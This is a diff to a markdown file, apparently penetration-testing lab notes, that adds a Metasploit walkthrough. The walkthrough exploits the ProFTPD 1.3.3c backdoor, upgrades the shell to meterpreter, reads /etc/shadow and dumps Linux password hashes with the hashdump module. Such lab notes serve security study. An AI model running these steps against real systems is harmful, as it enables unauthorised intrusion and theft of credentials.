@@ -12,5 +12,77 @@
 
 ![image](https://github.com/user-attachments/assets/e49a471f-b98a-4efb-82d5-f2b74c1a8789)
 
-## Demo
+## Demo: Linux Password Hashes
+
+We first exploit the target:
+
+`ifconfig, eth1`
+
+`nmap -sV [targetIP]`
+
+We check if this version of proftpd is vulnerable to a exploit:
+
+`searchsploit PROFTPD`
+
+We got a Backdoor Command Execution module
+
+`service postgresql start && msfconsole`
+
+`setg rhosts [targetIP]`
+
+`search proftpd`
+
+We want the proftpd_133c_backdoor:
+
+use [module name]
+
+`show options`
+
+`exploit`
+
+We get a command shell session:
+
+`/bin/bash -i`
+
+`id`
+
+We put this session in the background: CTRL + Z
+
+`yes`
+
+`sessions`
+
+We upgrade our session to a meterpreter session:
+
+`sessions -u 1`
+
+we get a error, but thats fine
+
+`sessions`
+
+`sysinfo`
+
+`getuid`
+
+We have successfully obtained a meterpreter session.
+
+`cat etc/shadow/`
+
+Another technique is the metasploit hashdump module.
+
+CTRL + Z to put the session in the background
+
+`search hashdump`
+
+We copy post/linux/gather/hashdump
+
+`use post/linux/gather/hashdump`
+
+`set SESSION 2` (our meterpreter session)
+
+`run`
+
+This will get the user accs that have passwords and gives us the hashed passwords and saves them.
+
+
 
